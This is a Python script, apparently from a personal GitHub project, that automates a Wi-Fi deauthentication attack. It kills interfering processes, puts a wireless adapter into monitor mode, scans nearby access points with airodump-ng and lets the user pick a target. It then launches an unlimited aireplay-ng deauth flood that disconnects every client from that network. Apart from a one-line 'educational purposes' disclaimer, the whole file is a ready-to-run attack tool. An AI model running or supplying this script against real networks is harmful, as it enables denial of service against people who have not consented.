  
#!/usr/bin/env python3
# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

active_wireless_networks = []


def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status


print(r"""
  _____     __      __ ___ __  __       ___  ___  ___  ___ 
 / ___/_ __/ /____ / //_(_) /_/ /___ __/ _ \/ _ \/ _ \/ _ \
/ /__/ // / __/ -_) ,< / / __/ __/ // / // / // / // / // /
\___/\_,_/\__/\__/_/|_/_/\__/\__/\_, /\___/\___/\___/\___/ 
                                /___/                      """)
print("\033[1;32;40m\n**********BY NAVANEETHA KRISHNAN M**********\n\n")
print("GitHub : https://github.com/Cutekitty0000\n")
print("Linkedin : https://in.linkedin.com/in/navaneetha-krishnan-m-8b41b52a1\n\n\n\033[0m")


if not 'SUDO_UID' in os.environ.keys():
    print("Use sudo!, We are using Hardware here!")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("There should be no .csv files in your dir ok?. So Creating a Backup dir")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("ID_HERE") ### your Wifi Module ID here

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print("There could be a problem in your controller, Contact DEVELOPER for this issue")
    exit()

print("Interfaces available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Select the wifi interface to use: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Enter a number of your choices.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

print("WiFi adapter is connected")


kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])


discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():

                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                       
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C to attack wireless network.\n")
        print("No |||||\tWifi Name             |||||\tWifi Channels|\tID                         |||||")
        for index, item in enumerate(active_wireless_networks):
          
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nMake Your choice.")

while True:
    choice = input("Select a choice from above networks: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

try:
    while True:
        print("Deauthenticating Users, press ctrl-c to stop")
except KeyboardInterrupt:
    print("Stop monitoring mode")
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    print("Exiting now")


    
